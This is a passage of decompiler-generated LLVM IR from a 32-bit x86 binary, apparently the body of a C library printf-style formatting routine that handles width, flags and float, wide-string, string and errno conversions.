  %v0_804e187 = phi i32 [ %v6_804e0fc, %dec_label_pc_804e12b ], [ %v6_804e0fc, %dec_label_pc_804e0e5 ], [ %v6_804e0fc, %dec_label_pc_804e127 ], [ %v1_804e117, %dec_label_pc_804e112 ], [ %v6_804e0fc, %dec_label_pc_804e12f ]
  %v0_804e196 = phi i32 [ %v1_804e101, %dec_label_pc_804e12b ], [ %v1_804e101, %dec_label_pc_804e0e5 ], [ %v1_804e101, %dec_label_pc_804e127 ], [ %v0_804e134.pre, %dec_label_pc_804e112 ], [ %v1_804e101, %dec_label_pc_804e12f ]
  %v1_804e134 = add i32 %v0_804e196, 204
  store i32 %v1_804e134, i32* %ecx.global-to-local, align 4
  %v1_804e13b = add i32 %v0_804e196, 20
  %v2_804e13b = inttoptr i32 %v1_804e13b to i32*
  %v3_804e13b = load i32, i32* %v2_804e13b, align 4
  store i32 %v3_804e13b, i32* %edx.global-to-local, align 4
  %v2_804e13f = sub i32 %v1_804e134, %v0_804e187
  store i32 %v2_804e13f, i32* %ecx.global-to-local, align 4
  %v2_804e141 = icmp slt i32 %v3_804e13b, 0
  %v1_804e143 = add i32 %v2_804e13f, 127
  store i32 %v1_804e143, i32* @esi, align 4
  %v1_804e146 = icmp eq i1 %v2_804e141, false
  br i1 %v1_804e146, label %dec_label_pc_804e14d, label %dec_label_pc_804e148

dec_label_pc_804e148:                             ; preds = %dec_label_pc_804e134
  store i32 1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e14d

dec_label_pc_804e14d:                             ; preds = %dec_label_pc_804e134, %dec_label_pc_804e148
  %v0_804e173 = phi i32 [ %v3_804e13b, %dec_label_pc_804e134 ], [ 1, %dec_label_pc_804e148 ]
  %v1_804e14d = add i32 %v0_804e196, 32
  %v2_804e14d = inttoptr i32 %v1_804e14d to i8*
  %v3_804e14d = load i8, i8* %v2_804e14d, align 1
  %v4_804e14d = and i8 %v3_804e14d, 16
  %v5_804e14d = icmp eq i8 %v4_804e14d, 0
  br i1 %v5_804e14d, label %dec_label_pc_804e187, label %dec_label_pc_804e154

dec_label_pc_804e154:                             ; preds = %dec_label_pc_804e14d
  %v1_804e154 = add i32 %v0_804e196, 48
  %v2_804e154 = inttoptr i32 %v1_804e154 to i32*
  %v3_804e154 = load i32, i32* %v2_804e154, align 4
  store i32 %v3_804e154, i32* %eax.global-to-local, align 4
  %tmp97 = icmp ult i32 %v3_804e154, 3
  br i1 %tmp97, label %dec_label_pc_804e16e.thread, label %dec_label_pc_804e162

dec_label_pc_804e16e.thread:                      ; preds = %dec_label_pc_804e154
  store i32 6, i32* @ebp, align 4
  br label %dec_label_pc_804e187

dec_label_pc_804e162:                             ; preds = %dec_label_pc_804e154
  %v9_804e162 = icmp eq i32 %v3_804e154, 3
  %v1_804e165 = icmp eq i1 %v9_804e162, false
  br i1 %v1_804e165, label %dec_label_pc_804e16e, label %dec_label_pc_804e167

dec_label_pc_804e167:                             ; preds = %dec_label_pc_804e162
  store i32 9, i32* @ebp, align 4
  br label %dec_label_pc_804e187

dec_label_pc_804e16e:                             ; preds = %dec_label_pc_804e162
  %v9_804e16e = icmp eq i32 %v3_804e154, 4
  %v1_804e171 = icmp eq i1 %v9_804e16e, false
  br i1 %v1_804e171, label %dec_label_pc_804e187, label %dec_label_pc_804e173

dec_label_pc_804e173:                             ; preds = %dec_label_pc_804e16e
  %tmp98 = icmp ugt i32 %v0_804e173, %v1_804e143
  br i1 %tmp98, label %dec_label_pc_804e187, label %dec_label_pc_804e177

dec_label_pc_804e177:                             ; preds = %dec_label_pc_804e173
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_804e17c = inttoptr i32 %v0_804e187 to i8*
  %v2_804e17c = load i8, i8* %v1_804e17c, align 1
  %v8_804e17c = icmp eq i8 %v2_804e17c, 48
  br i1 %v8_804e17c, label %dec_label_pc_804e187, label %dec_label_pc_804e181

dec_label_pc_804e181:                             ; preds = %dec_label_pc_804e177
  %v1_804e181 = add i32 %v2_804e13f, 128
  store i32 %v1_804e181, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e187

dec_label_pc_804e187:                             ; preds = %dec_label_pc_804e16e.thread, %dec_label_pc_804e173, %dec_label_pc_804e177, %dec_label_pc_804e16e, %dec_label_pc_804e14d, %dec_label_pc_804e167, %dec_label_pc_804e181
  %v0_804e1bf = phi i32 [ %v0_804e173, %dec_label_pc_804e173 ], [ 1, %dec_label_pc_804e177 ], [ %v0_804e173, %dec_label_pc_804e16e ], [ %v0_804e173, %dec_label_pc_804e14d ], [ %v0_804e173, %dec_label_pc_804e167 ], [ %v1_804e181, %dec_label_pc_804e181 ], [ %v0_804e173, %dec_label_pc_804e16e.thread ]
  %v1_804e187 = inttoptr i32 %v0_804e187 to i8*
  %v2_804e187 = load i8, i8* %v1_804e187, align 1
  %v8_804e187 = icmp eq i8 %v2_804e187, 48
  %v1_804e18a = icmp eq i1 %v8_804e187, false
  br i1 %v1_804e18a, label %dec_label_pc_804e1b7, label %dec_label_pc_804e18c

dec_label_pc_804e18c:                             ; preds = %dec_label_pc_804e187
  %v0_804e18c = load i32, i32* @ebp, align 4
  %v7_804e18f = icmp sgt i32 %v0_804e18c, 5
  br i1 %v7_804e18f, label %dec_label_pc_804e191, label %dec_label_pc_804e196

dec_label_pc_804e191:                             ; preds = %dec_label_pc_804e18c
  store i32 11, i32* @ebp, align 4
  br label %dec_label_pc_804e196

dec_label_pc_804e196:                             ; preds = %dec_label_pc_804e18c, %dec_label_pc_804e191
  %v1_804e196 = add i32 %v0_804e196, 48
  %v2_804e196 = inttoptr i32 %v1_804e196 to i32*
  %v3_804e196 = load i32, i32* %v2_804e196, align 4
  %v12_804e196 = icmp eq i32 %v3_804e196, 1
  %v1_804e19b = icmp eq i1 %v12_804e196, false
  br i1 %v1_804e19b, label %dec_label_pc_804e1ac, label %dec_label_pc_804e19d

dec_label_pc_804e19d:                             ; preds = %dec_label_pc_804e196
  store i32 ptrtoint ([6 x i8]* @global_var_8050980.114 to i32), i32* @edi, align 4
  store i32 5, i32* @esi, align 4
  br label %dec_label_pc_804e328

dec_label_pc_804e1ac:                             ; preds = %dec_label_pc_804e196
  %v1_804e1ac = icmp eq i32 %v0_804e1bf, 0
  %v1_804e1ae = icmp eq i1 %v1_804e1ac, false
  br i1 %v1_804e1ae, label %dec_label_pc_804e1b7, label %dec_label_pc_804e1b0

dec_label_pc_804e1b0:                             ; preds = %dec_label_pc_804e1ac
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804e328

dec_label_pc_804e1b7:                             ; preds = %dec_label_pc_804e1ac, %dec_label_pc_804e187
  %v2_804e1b7 = sub i32 %v0_804e1bf, %v1_804e143
  %v7_804e1b7 = icmp ult i32 %v0_804e1bf, %v1_804e143
  %v12_804e1b7 = icmp eq i32 %v2_804e1b7, 0
  %v2_804e1b9 = or i1 %v7_804e1b7, %v12_804e1b7
  br i1 %v2_804e1b9, label %dec_label_pc_804e328, label %dec_label_pc_804e1bf

dec_label_pc_804e1bf:                             ; preds = %dec_label_pc_804e1b7
  store i32 %v2_804e1b7, i32* @ebx, align 4
  br label %dec_label_pc_804e342

dec_label_pc_804e1c8:                             ; preds = %dec_label_pc_804e05e
  %tmp99 = icmp ult i32 %v3_804e030, 16
  br i1 %tmp99, label %dec_label_pc_804e1cd, label %dec_label_pc_804e212

dec_label_pc_804e1cd:                             ; preds = %dec_label_pc_804e1c8
  %v1_804e1cd = add i32 %v0_804e030.lcssa, 33
  %v2_804e1cd = inttoptr i32 %v1_804e1cd to i8*
  %v3_804e1cd = load i8, i8* %v2_804e1cd, align 1
  %v4_804e1cd = and i8 %v3_804e1cd, 8
  %v5_804e1cd = icmp eq i8 %v4_804e1cd, 0
  %v1_804e1d2 = add i32 %v0_804e030.lcssa, 344
  %v2_804e1d2 = inttoptr i32 %v1_804e1d2 to i32*
  %v3_804e1d2 = load i32, i32* %v2_804e1d2, align 4
  store i32 %v3_804e1d2, i32* %edx.global-to-local, align 4
  br i1 %v5_804e1cd, label %dec_label_pc_804e1df, label %dec_label_pc_804e1db

dec_label_pc_804e1db:                             ; preds = %dec_label_pc_804e1cd
  %v1_804e1db = inttoptr i32 %v3_804e1d2 to x86_fp80*
  %v2_804e1db = load x86_fp80, x86_fp80* %v1_804e1db, align 4
  br label %dec_label_pc_804e1e1

dec_label_pc_804e1df:                             ; preds = %dec_label_pc_804e1cd
  %v1_804e1df = inttoptr i32 %v3_804e1d2 to double*
  %v2_804e1df = load double, double* %v1_804e1df, align 4
  %v3_804e1df = fpext double %v2_804e1df to x86_fp80
  br label %dec_label_pc_804e1e1

dec_label_pc_804e1e1:                             ; preds = %dec_label_pc_804e1db, %dec_label_pc_804e1df
  %storemerge5 = phi x86_fp80 [ %v2_804e1db, %dec_label_pc_804e1db ], [ %v3_804e1df, %dec_label_pc_804e1df ]
  store x86_fp80 %storemerge5, x86_fp80* %st0.global-to-local, align 4
  %v0_804e1e1 = load i32, i32* @esi, align 4
  %v2_804e1e1 = add i32 %v0_804e030.lcssa, -4
  %v3_804e1e1 = inttoptr i32 %v2_804e1e1 to i32*
  store i32 %v0_804e1e1, i32* %v3_804e1e1, align 4
  %v0_804e1e2 = load i32, i32* @esi, align 4
  %v2_804e1e2 = add i32 %v0_804e030.lcssa, -8
  %v3_804e1e2 = inttoptr i32 %v2_804e1e2 to i32*
  store i32 %v0_804e1e2, i32* %v3_804e1e2, align 4
  %v1_804e1e3 = add i32 %v0_804e030.lcssa, -12
  %v2_804e1e3 = inttoptr i32 %v1_804e1e3 to i32*
  store i32 134536870, i32* %v2_804e1e3, align 4
  %v1_804e1e8 = add i32 %v0_804e030.lcssa, 20
  store i32 %v1_804e1e8, i32* %eax.global-to-local, align 4
  %v2_804e1ec = add i32 %v0_804e030.lcssa, -16
  %v3_804e1ec = inttoptr i32 %v2_804e1ec to i32*
  store i32 %v1_804e1e8, i32* %v3_804e1ec, align 4
  %v1_804e1ed = add i32 %v0_804e030.lcssa, -28
  %v1_804e1f0 = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v3_804e1f0 = inttoptr i32 %v1_804e1ed to x86_fp80*
  store x86_fp80 %v1_804e1f0, x86_fp80* %v3_804e1f0, align 4
  %v1_804e1f3 = add i32 %v0_804e030.lcssa, 368
  %v2_804e1f3 = inttoptr i32 %v1_804e1f3 to i32*
  %v3_804e1f3 = load i32, i32* %v2_804e1f3, align 4
  %v5_804e1f3 = add i32 %v0_804e030.lcssa, -32
  %v6_804e1f3 = inttoptr i32 %v5_804e1f3 to i32*
  store i32 %v3_804e1f3, i32* %v6_804e1f3, align 4
  %v0_804e1fa = call i32 @_fpmaxtostr()
  store i32 %v0_804e1fa, i32* %eax.global-to-local, align 4
  %v0_804e1ff = load i32, i32* @esp, align 4
  %v1_804e1ff = add i32 %v0_804e1ff, 32
  %v2_804e202 = icmp slt i32 %v0_804e1fa, 0
  br i1 %v2_804e202, label %dec_label_pc_804e4a3, label %dec_label_pc_804e20a

dec_label_pc_804e20a:                             ; preds = %dec_label_pc_804e1e1
  %v1_804e20a = inttoptr i32 %v1_804e1ff to i32*
  %v2_804e20a = load i32, i32* %v1_804e20a, align 4
  %v4_804e20a = add i32 %v2_804e20a, %v0_804e1fa
  store i32 %v4_804e20a, i32* %v1_804e20a, align 4
  %v0_804e490.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e490

dec_label_pc_804e212:                             ; preds = %dec_label_pc_804e1c8
  %tmp100 = or i32 %v3_804e030, 1
  %tmp101 = icmp eq i32 %tmp100, 17
  br i1 %tmp101, label %dec_label_pc_804e21b, label %dec_label_pc_804e2ae

dec_label_pc_804e21b:                             ; preds = %dec_label_pc_804e212
  %v9_804e212 = icmp eq i32 %v3_804e030, 17
  %v1_804e21b = add i32 %v0_804e030.lcssa, 332
  %v2_804e21b = inttoptr i32 %v1_804e21b to i32*
  store i32 0, i32* %v2_804e21b, align 4
  %v0_804e226 = load i32, i32* @esp, align 4
  %v1_804e226 = add i32 %v0_804e226, 344
  %v2_804e226 = inttoptr i32 %v1_804e226 to i32*
  %v3_804e226 = load i32, i32* %v2_804e226, align 4
  store i32 %v3_804e226, i32* %edx.global-to-local, align 4
  %v1_804e22d = icmp eq i1 %v9_804e212, false
  br i1 %v1_804e22d, label %dec_label_pc_804e279, label %dec_label_pc_804e22f

dec_label_pc_804e22f:                             ; preds = %dec_label_pc_804e21b
  %v1_804e22f = inttoptr i32 %v3_804e226 to i32*
  %v2_804e22f = load i32, i32* %v1_804e22f, align 4
  store i32 %v2_804e22f, i32* %eax.global-to-local, align 4
  %v2_804e231 = add i32 %v0_804e226, 340
  %v3_804e231 = inttoptr i32 %v2_804e231 to i32*
  store i32 %v2_804e22f, i32* %v3_804e231, align 4
  %v0_804e238 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e238 = icmp eq i32 %v0_804e238, 0
  br i1 %v1_804e238, label %dec_label_pc_804e32c, label %dec_label_pc_804e240

dec_label_pc_804e240:                             ; preds = %dec_label_pc_804e22f
  %v0_804e240 = load i32, i32* @esp, align 4
  %v1_804e240 = add i32 %v0_804e240, 20
  %v2_804e240 = inttoptr i32 %v1_804e240 to i32*
  %v3_804e240 = load i32, i32* %v2_804e240, align 4
  store i32 %v3_804e240, i32* %eax.global-to-local, align 4
  %v2_804e247 = icmp slt i32 %v3_804e240, 0
  br i1 %v2_804e247, label %dec_label_pc_804e24d, label %dec_label_pc_804e24b

dec_label_pc_804e24b:                             ; preds = %dec_label_pc_804e240
  br label %dec_label_pc_804e24d

dec_label_pc_804e24d:                             ; preds = %dec_label_pc_804e240, %dec_label_pc_804e24b
  %storemerge105 = phi i32 [ %v3_804e240, %dec_label_pc_804e24b ], [ -1, %dec_label_pc_804e240 ]
  store i32 %storemerge105, i32* %ecx.global-to-local, align 4
  %v1_804e24d = add i32 %v0_804e240, 340
  store i32 %v1_804e24d, i32* %edx.global-to-local, align 4
  %v1_804e254 = add i32 %v0_804e240, 332
  store i32 %v1_804e254, i32* %eax.global-to-local, align 4
  %v2_804e25b = add i32 %v0_804e240, -4
  %v3_804e25b = inttoptr i32 %v2_804e25b to i32*
  store i32 %v1_804e254, i32* %v3_804e25b, align 4
  %v0_804e25c = load i32, i32* %ecx.global-to-local, align 4
  %v2_804e25c = add i32 %v0_804e240, -8
  %v3_804e25c = inttoptr i32 %v2_804e25c to i32*
  store i32 %v0_804e25c, i32* %v3_804e25c, align 4
  %v0_804e25d = load i32, i32* %edx.global-to-local, align 4
  %v2_804e25d = add i32 %v0_804e240, -12
  %v3_804e25d = inttoptr i32 %v2_804e25d to i32*
  store i32 %v0_804e25d, i32* %v3_804e25d, align 4
  %v0_804e25e = load i32, i32* %edx.global-to-local, align 4
  %v2_804e25e = add i32 %v0_804e240, -16
  %v3_804e25e = inttoptr i32 %v2_804e25e to i32*
  store i32 %v0_804e25e, i32* %v3_804e25e, align 4
  %v0_804e25f = call i32 @__GI_wcsrtombs()
  store i32 %v0_804e25f, i32* %eax.global-to-local, align 4
  %v0_804e264 = load i32, i32* @esp, align 4
  %v1_804e264 = add i32 %v0_804e264, 16
  store i32 %v0_804e25f, i32* @esi, align 4
  %v10_804e269 = icmp eq i32 %v0_804e25f, -1
  br i1 %v10_804e269, label %dec_label_pc_804e4a3, label %dec_label_pc_804e272

dec_label_pc_804e272:                             ; preds = %dec_label_pc_804e24d
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_804e336

dec_label_pc_804e279:                             ; preds = %dec_label_pc_804e21b
  %v0_804e279 = load i32, i32* @ebx, align 4
  %v2_804e279 = add i32 %v0_804e226, -4
  %v3_804e279 = inttoptr i32 %v2_804e279 to i32*
  store i32 %v0_804e279, i32* %v3_804e279, align 4
  %v1_804e27a = add i32 %v0_804e226, 332
  store i32 %v1_804e27a, i32* %eax.global-to-local, align 4
  %v2_804e281 = add i32 %v0_804e226, -8
  %v3_804e281 = inttoptr i32 %v2_804e281 to i32*
  store i32 %v1_804e27a, i32* %v3_804e281, align 4
  %v0_804e282 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e282 = inttoptr i32 %v0_804e282 to i32*
  %v2_804e282 = load i32, i32* %v1_804e282, align 4
  %v4_804e282 = add i32 %v0_804e226, -12
  %v5_804e282 = inttoptr i32 %v4_804e282 to i32*
  store i32 %v2_804e282, i32* %v5_804e282, align 4
  %v1_804e284 = add i32 %v0_804e226, 204
  store i32 %v1_804e284, i32* @ebx, align 4
  %v2_804e28b = add i32 %v0_804e226, -16
  %v3_804e28b = inttoptr i32 %v2_804e28b to i32*
  store i32 %v1_804e284, i32* %v3_804e28b, align 4
  %v0_804e28c = call i32 @__GI_wcrtomb()
  store i32 %v0_804e28c, i32* %eax.global-to-local, align 4
  %v0_804e291 = load i32, i32* @esp, align 4
  %v1_804e291 = add i32 %v0_804e291, 16
  store i32 %v0_804e28c, i32* @esi, align 4
  %v10_804e296 = icmp eq i32 %v0_804e28c, -1
  br i1 %v10_804e296, label %dec_label_pc_804e4a3, label %dec_label_pc_804e29f

dec_label_pc_804e29f:                             ; preds = %dec_label_pc_804e279
  %v0_804e29f = load i32, i32* @ebx, align 4
  store i32 %v0_804e29f, i32* @edi, align 4
  %v2_804e2a1 = add i32 %v0_804e28c, 220
  %v3_804e2a1 = add i32 %v2_804e2a1, %v0_804e291
  %v4_804e2a1 = inttoptr i32 %v3_804e2a1 to i8*
  store i8 0, i8* %v4_804e2a1, align 1
  br label %dec_label_pc_804e336

dec_label_pc_804e2ae:                             ; preds = %dec_label_pc_804e212
  %tmp102 = icmp ult i32 %v3_804e030, 20
  br i1 %tmp102, label %dec_label_pc_804e2b3, label %dec_label_pc_804e2fe

dec_label_pc_804e2b3:                             ; preds = %dec_label_pc_804e2ae
  %v9_804e2ae = icmp eq i32 %v3_804e030, 19
  %v1_804e2b3 = add i32 %v0_804e030.lcssa, 344
  %v2_804e2b3 = inttoptr i32 %v1_804e2b3 to i32*
  %v3_804e2b3 = load i32, i32* %v2_804e2b3, align 4
  store i32 %v3_804e2b3, i32* %edx.global-to-local, align 4
  %v1_804e2ba = icmp eq i1 %v9_804e2ae, false
  %v1_804e2df = inttoptr i32 %v3_804e2b3 to i32*
  %v2_804e2df = load i32, i32* %v1_804e2df, align 4
  br i1 %v1_804e2ba, label %dec_label_pc_804e2df, label %dec_label_pc_804e2bc

dec_label_pc_804e2bc:                             ; preds = %dec_label_pc_804e2b3
  store i32 %v2_804e2df, i32* @edi, align 4
  %v1_804e2be = icmp eq i32 %v2_804e2df, 0
  br i1 %v1_804e2be, label %dec_label_pc_804e32c, label %dec_label_pc_804e2c2

dec_label_pc_804e2c2:                             ; preds = %dec_label_pc_804e2bc, %dec_label_pc_804e307
  %v1_804e2cf = phi i32 [ %v0_804e030.lcssa, %dec_label_pc_804e2bc ], [ %v1_804e321, %dec_label_pc_804e307 ]
  %v1_804e2c2 = add i32 %v1_804e2cf, 20
  %v2_804e2c2 = inttoptr i32 %v1_804e2c2 to i32*
  %v3_804e2c2 = load i32, i32* %v2_804e2c2, align 4
  store i32 %v3_804e2c2, i32* %eax.global-to-local, align 4
  %v2_804e2c9 = icmp slt i32 %v3_804e2c2, 0
  br i1 %v2_804e2c9, label %dec_label_pc_804e2cf, label %dec_label_pc_804e2cd

dec_label_pc_804e2cd:                             ; preds = %dec_label_pc_804e2c2
  br label %dec_label_pc_804e2cf

dec_label_pc_804e2cf:                             ; preds = %dec_label_pc_804e2c2, %dec_label_pc_804e2cd
  %storemerge = phi i32 [ %v3_804e2c2, %dec_label_pc_804e2cd ], [ -1, %dec_label_pc_804e2c2 ]
  store i32 %storemerge, i32* %edx.global-to-local, align 4
  %v2_804e2cf = add i32 %v1_804e2cf, -4
  %v3_804e2cf = inttoptr i32 %v2_804e2cf to i32*
  store i32 %v3_804e030, i32* %v3_804e2cf, align 4
  %v2_804e2d0 = add i32 %v1_804e2cf, -8
  %v3_804e2d0 = inttoptr i32 %v2_804e2d0 to i32*
  store i32 %v3_804e030, i32* %v3_804e2d0, align 4
  %v0_804e2d1 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e2d1 = add i32 %v1_804e2cf, -12
  %v3_804e2d1 = inttoptr i32 %v2_804e2d1 to i32*
  store i32 %v0_804e2d1, i32* %v3_804e2d1, align 4
  %v0_804e2d2 = load i32, i32* @edi, align 4
  %v2_804e2d2 = add i32 %v1_804e2cf, -16
  %v3_804e2d2 = inttoptr i32 %v2_804e2d2 to i32*
  store i32 %v0_804e2d2, i32* %v3_804e2d2, align 4
  %v0_804e2d3 = call i32 @strnlen()
  store i32 %v0_804e2d3, i32* %eax.global-to-local, align 4
  store i32 %v0_804e2d3, i32* @esi, align 4
  br label %dec_label_pc_804e336

dec_label_pc_804e2df:                             ; preds = %dec_label_pc_804e2b3
  store i32 %v2_804e2df, i32* %eax.global-to-local, align 4
  %v1_804e2e1 = add i32 %v0_804e030.lcssa, 204
  store i32 %v1_804e2e1, i32* @edi, align 4
  store i32 1, i32* @esi, align 4
  %v1_804e2ed = trunc i32 %v2_804e2df to i8
  %v4_804e2ed = inttoptr i32 %v1_804e2e1 to i8*
  store i8 %v1_804e2ed, i8* %v4_804e2ed, align 1
  %v0_804e2f4 = load i32, i32* @esp, align 4
  %v1_804e2f4 = add i32 %v0_804e2f4, 205
  %v2_804e2f4 = inttoptr i32 %v1_804e2f4 to i8*
  store i8 0, i8* %v2_804e2f4, align 1
  br label %dec_label_pc_804e336

dec_label_pc_804e2fe:                             ; preds = %dec_label_pc_804e2ae
  %v9_804e2fe = icmp eq i32 %v3_804e030, 20
  %v1_804e301 = icmp eq i1 %v9_804e2fe, false
  br i1 %v1_804e301, label %dec_label_pc_804e4a3, label %dec_label_pc_804e307

dec_label_pc_804e307:                             ; preds = %dec_label_pc_804e2fe
  %v0_804e307 = load i32, i32* %stack_var_-364, align 4
  %v1_804e307 = call i32 @__errno_location(i32 %v0_804e307)
  store i32 %v1_804e307, i32* %eax.global-to-local, align 4
  %v0_804e30c = load i32, i32* %edx.global-to-local, align 4
  %v1_804e30c = load i32, i32* @esp, align 4
  %v2_804e30c = add i32 %v1_804e30c, -4
  %v3_804e30c = inttoptr i32 %v2_804e30c to i32*
  store i32 %v0_804e30c, i32* %v3_804e30c, align 4
  %v1_804e30d = add i32 %v1_804e30c, -8
  %v2_804e30d = inttoptr i32 %v1_804e30d to i32*
  store i32 128, i32* %v2_804e30d, align 4
  %v1_804e312 = add i32 %v1_804e30c, 204
  store i32 %v1_804e312, i32* %edx.global-to-local, align 4
  %v2_804e319 = add i32 %v1_804e30c, -12
  %v3_804e319 = inttoptr i32 %v2_804e319 to i32*
  store i32 %v1_804e312, i32* %v3_804e319, align 4
  %v1_804e31a = inttoptr i32 %v1_804e307 to i32*
  %v2_804e31a = load i32, i32* %v1_804e31a, align 4
  %v4_804e31a = add i32 %v1_804e30c, -16
  %v5_804e31a = inttoptr i32 %v4_804e31a to i32*
  store i32 %v2_804e31a, i32* %v5_804e31a, align 4
  %v0_804e31c = call i32 @__GI___glibc_strerror_r()
  store i32 %v0_804e31c, i32* %eax.global-to-local, align 4
  %v0_804e321 = load i32, i32* @esp, align 4
  %v1_804e321 = add i32 %v0_804e321, 16
  store i32 %v0_804e31c, i32* @edi, align 4
  br label %dec_label_pc_804e2c2

dec_label_pc_804e328:                             ; preds = %dec_label_pc_804e1b7, %dec_label_pc_804e1b0, %dec_label_pc_804e19d
  %v0_804e34237 = phi i32 [ %v1_804e143, %dec_label_pc_804e1b7 ], [ 0, %dec_label_pc_804e1b0 ], [ 5, %dec_label_pc_804e19d ]
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804e342

dec_label_pc_804e32c:                             ; preds = %dec_label_pc_804e2bc, %dec_label_pc_804e22f
  store i32 ptrtoint ([7 x i8]* @global_var_8050986.115 to i32), i32* @edi, align 4
  store i32 6, i32* @esi, align 4
  br label %dec_label_pc_804e336

dec_label_pc_804e336:                             ; preds = %dec_label_pc_804e2df, %dec_label_pc_804e2cf, %dec_label_pc_804e29f, %dec_label_pc_804e272, %dec_label_pc_804e32c
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  %v0_804e33d = load i32, i32* @esp, align 4
  %v1_804e33d = add i32 %v0_804e33d, 7
  %v2_804e33d = inttoptr i32 %v1_804e33d to i8*
  store i8 32, i8* %v2_804e33d, align 1
  %v0_804e342.pre = load i32, i32* @esi, align 4
  %v1_804e342.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e342

dec_label_pc_804e342:                             ; preds = %dec_label_pc_804e328, %dec_label_pc_804e1bf, %dec_label_pc_804e336
  %v1_804e342 = phi i32 [ 0, %dec_label_pc_804e328 ], [ %v2_804e1b7, %dec_label_pc_804e1bf ], [ %v1_804e342.pre, %dec_label_pc_804e336 ]
  %v0_804e342 = phi i32 [ %v0_804e34237, %dec_label_pc_804e328 ], [ %v1_804e143, %dec_label_pc_804e1bf ], [ %v0_804e342.pre, %dec_label_pc_804e336 ]
  %v2_804e342 = add i32 %v0_804e342, %v1_804e342
  store i32 %v2_804e342, i32* @edx, align 4
  %v0_804e345 = load i32, i32* @ebp, align 4
  %v9_804e345 = icmp eq i32 %v0_804e345, 11
  br i1 %v9_804e345, label %dec_label_pc_804e356, label %dec_label_pc_804e34a

dec_label_pc_804e34a:                             ; preds = %dec_label_pc_804e342
  %v1_804e34c = add i32 %v0_804e345, -5
  %v6_804e34c = sub i32 4, %v0_804e345
  %v7_804e34c = and i32 %v6_804e34c, %v0_804e345
  %v8_804e34c = icmp slt i32 %v7_804e34c, 0
  %v9_804e34c = icmp eq i32 %v1_804e34c, 0
  %v10_804e34c = icmp slt i32 %v1_804e34c, 0
  %v3_804e34f = icmp eq i1 %v10_804e34c, %v8_804e34c
  %v4_804e34f = icmp eq i1 %v9_804e34c, false
  %v5_804e34f = and i1 %v4_804e34f, %v3_804e34f
  %v6_804e34f = zext i1 %v5_804e34f to i32
  store i32 %v6_804e34f, i32* %eax.global-to-local, align 4
  %v2_804e352 = add i32 %v2_804e342, 1
  %v3_804e352 = add i32 %v2_804e352, %v6_804e34f
  store i32 %v3_804e352, i32* @edx, align 4
  br label %dec_label_pc_804e356

dec_label_pc_804e356:                             ; preds = %dec_label_pc_804e342, %dec_label_pc_804e34a
  %v0_804e356 = load i32, i32* @esp, align 4
  %v1_804e356 = add i32 %v0_804e356, 24
  %v2_804e356 = inttoptr i32 %v1_804e356 to i32*
  %v3_804e356 = load i32, i32* %v2_804e356, align 4
  store i32 %v3_804e356, i32* %eax.global-to-local, align 4
  %v1_804e35a = add i32 %v0_804e356, 8
  %v2_804e35a = inttoptr i32 %v1_804e35a to i32*
  store i32 0, i32* %v2_804e35a, align 4
  %v0_804e362 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e362 = load i32, i32* @edx, align 4
  %v2_804e362 = sub i32 %v0_804e362, %v1_804e362
  %v7_804e362 = icmp ult i32 %v0_804e362, %v1_804e362
  %v12_804e362 = icmp eq i32 %v2_804e362, 0
  %v2_804e364 = or i1 %v7_804e362, %v12_804e362
  br i1 %v2_804e364, label %dec_label_pc_804e36c, label %dec_label_pc_804e366

dec_label_pc_804e366:                             ; preds = %dec_label_pc_804e356
  store i32 %v2_804e362, i32* %eax.global-to-local, align 4
  %v1_804e368 = load i32, i32* @esp, align 4
  %v2_804e368 = add i32 %v1_804e368, 8
  %v3_804e368 = inttoptr i32 %v2_804e368 to i32*
  store i32 %v2_804e362, i32* %v3_804e368, align 4
  %v0_804e370.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804e36c

dec_label_pc_804e36c:                             ; preds = %dec_label_pc_804e356, %dec_label_pc_804e366
  %v0_804e370 = phi i32 [ %v1_804e362, %dec_label_pc_804e356 ], [ %v0_804e370.pre, %dec_label_pc_804e366 ]
  %v0_804e36c = load i32, i32* @esp, align 4
  %v1_804e36c = add i32 %v0_804e36c, 8
  %v2_804e36c = inttoptr i32 %v1_804e36c to i32*
  %v3_804e36c = load i32, i32* %v2_804e36c, align 4
  store i32 %v3_804e36c, i32* @ecx, align 4
  %v2_804e370 = add i32 %v3_804e36c, %v0_804e370
  store i32 %v2_804e370, i32* %eax.global-to-local, align 4
  %v1_804e373 = inttoptr i32 %v0_804e36c to i32*
  %v2_804e373 = load i32, i32* %v1_804e373, align 4
  %v4_804e373 = add i32 %v2_804e373, %v2_804e370
  store i32 %v4_804e373, i32* %v1_804e373, align 4
  %v0_804e376 = load i32, i32* @esp, align 4
  %v1_804e376 = add i32 %v0_804e376, 7
  %v2_804e376 = inttoptr i32 %v1_804e376 to i8*
  %v3_804e376 = load i8, i8* %v2_804e376, align 1
  %v9_804e376 = icmp eq i8 %v3_804e376, 48
  %v1_804e37b = icmp eq i1 %v9_804e376, false
  br i1 %v1_804e37b, label %dec_label_pc_804e387, label %dec_label_pc_804e37d

dec_label_pc_804e37d:                             ; preds = %dec_label_pc_804e36c
  %v0_804e37d = load i32, i32* @ebx, align 4
  %v1_804e37d = load i32, i32* @ecx, align 4
  %v2_804e37d = add i32 %v1_804e37d, %v0_804e37d
  store i32 %v2_804e37d, i32* @ebx, align 4
  %v1_804e37f = add i32 %v0_804e376, 8
  %v2_804e37f = inttoptr i32 %v1_804e37f to i32*
  store i32 0, i32* %v2_804e37f, align 4
  %v0_804e387.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e387

dec_label_pc_804e387:                             ; preds = %dec_label_pc_804e36c, %dec_label_pc_804e37d
  %v0_804e38e = phi i32 [ %v0_804e376, %dec_label_pc_804e36c ], [ %v0_804e387.pre, %dec_label_pc_804e37d ]
  %v1_804e387 = add i32 %v0_804e38e, 32
